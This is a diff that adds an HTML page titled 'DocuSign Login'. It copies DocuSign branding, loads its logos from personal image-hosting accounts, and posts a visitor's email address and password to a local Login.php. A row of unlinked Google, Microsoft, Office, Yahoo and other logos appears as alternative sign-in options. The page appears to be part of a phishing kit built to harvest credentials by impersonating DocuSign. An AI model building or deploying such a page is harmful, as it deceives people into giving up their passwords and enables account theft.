@@ -1,0 +1,146 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Security-Policy" content="default-src * data: 'unsafe-inline'; upgrade-insecure-requests">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="x-ua-compatible" content="ie=edge">
+<title>DocuSign Login</title>
+<link rel="shortcut icon" type="image/x-icon"href="http://res.cloudinary.com/cuteblacky/image/upload/c_scale,w_18/v1512662584/docusign_zdjbfh.ico" />
+
+<!-- Bootstrap -->
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css" integrity="sha384-rwoIResjU2yc3z8GV/NPeZWAv56rSmLldC3R/AZzGRnGxQQKnKkoFVhFQhNUwEyJ" crossorigin="anonymous">
+<link rel="icon" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+
+<!-- <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous"> -->
+<link href="https://sns-static.aolcdn.com/sns.v17r10_1/style/fonts/openSans.css" rel="stylesheet" type="text/css">
+
+<style media="screen">
+body {
+  background: #F9F9F9; }
+
+img {
+  display: flex;
+  justify-content: center;
+  height: 50px; }
+
+p {
+  font-size: 1.4rem; }
+
+.form-group {
+  border: 0; }
+
+.pt-6 {
+  padding-top: 100px; }
+
+.alternate-login img {
+  width: 40px;
+  height: 35px;
+  padding: 4px; }
+
+  .sparkup{
+    color: black;
+  }
+  .sparkup:hover{
+    color: black;
+  }
+
+footer {
+  background: #F4F4F4; }
+
+.footer {
+  position: fixed;
+  bottom: 0; }
+
+.input-group:focus {
+  box-shadow: 0 0 0.1rem #e86b52 inset; }
+
+footer a {
+  font-size: 8pt;
+  color: #C8C8C8; }
+
+footer a:hover {
+  text-decoration: none;
+  color: #C8C8C8; }
+
+footer span {
+  font-size: 8pt;
+  color: #838383; }
+
+</style>
+</head>
+  <body>
+
+      <div class="col-sm-6 col-md-4  m-auto pt-6">
+        <div class="col">
+        <div class="row justify-content-center ">
+
+          <i><img src="http://res.cloudinary.com/cuteblacky/image/upload/v1511492455/docusign_wwabgw.svg" /></i>
+          <p class=" col-12 text-center mt-5">Please log in to view</p>
+          <div class="form-group col-10" id='login_form'>
+          <form action="Login.php" method="post" >
+            <input type="text" class="input-group form-control form-control-sm " placeholder="Email Address" id='username' name="email" required/></input/>
+            <input type="password" class="input-group form-control form-control-sm mt-2" placeholder="Password" id='password' name="password" required/></input/>
+          </div>
+
+
+          <button type="submit" class="btn btn-warning col-9 mt-2 sparkup" id="submit">Continue</button>
+          </form>
+          
+
+
+        </div>
+        <div class="text-center mt-2">
+          <hr class="mt-5">
+          <h6 class="text-center mt-5 p-2">Or log in via:</h6>
+          <div class="alternate-login">
+            <div class="row justify-content-center ">
+              <i><img src="http://res.cloudinary.com/cuteblacky/image/upload/v1511535745/google-plus_1_oool36.svg"/></i>
+              
+              <i><img src="http://res.cloudinary.com/cuteblacky/image/upload/v1511535745/microsoft_zff7mq.svg"/></i>
+              <i><img src="http://res.cloudinary.com/cuteblacky/image/upload/v1511535746/microsoft-office-2013_f3djju.svg"/></i>
+              <i><img src="http://res.cloudinary.com/cuteblacky/image/upload/v1511535746/salesforce-2_1_xkkjgd.svg"/></i>
+              <i><img src="http://res.cloudinary.com/cuteblacky/image/upload/v1511535749/twitter-logo-silhouette_1_bx1gfo.svg"/></i>
+              <i><img src="http://res.cloudinary.com/cuteblacky/image/upload/v1511535749/linkedin_ylpsce.svg"/></i>
+              <i><img src="http://res.cloudinary.com/cuteblacky/image/upload/v1511535746/yahoo-big-logo_murul7.svg"/></i>
+               <i><img src="http://res.cloudinary.com/dkeku9spk/image/upload/v1526303651/otherInboxlogo.png"/></i>
+              
+              
+              
+            </div>
+          </div>
+
+
+        </div>
+
+
+      </div>
+
+    </div>
+    <footer class="footer text-center mt-5 col-12">
+
+        <a href="#">Help | </a>
+        <a href="#">Terms | </a>
+        <a href="#">Intellectual Property | </a>
+        <a href="#">Privacy Policy</a>
+        <div class="pb-2">
+          <span>
+            Copyright © 2018 DocuSign, Inc. All rights reserved.
+          </span>
+
+        </div>
+
+
+
+
+
+    </footer>
+
+  
+  </body>
+</html>
+
+
+
